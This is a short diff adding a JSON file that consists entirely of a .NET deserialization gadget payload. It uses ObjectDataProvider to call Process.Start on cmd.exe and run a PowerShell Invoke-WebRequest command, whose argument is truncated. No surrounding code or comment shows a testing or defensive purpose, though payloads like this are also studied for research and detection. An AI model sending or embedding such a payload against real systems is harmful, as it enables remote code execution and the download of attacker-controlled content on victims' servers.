@@ -1,0 +1,11 @@
+{
+  "__type": "System.Windows.Data.ObjectDataProvider",
+  "MethodName": "Start",
+  "ObjectInstance": {
+    "__type": "System.Diagnostics.Process",
+    "StartInfo": {
+      "FileName": "cmd.exe",
+      "Arguments": "/c powershell.exe -Command Invoke-WebRequest..."
+    }
+  }
+}
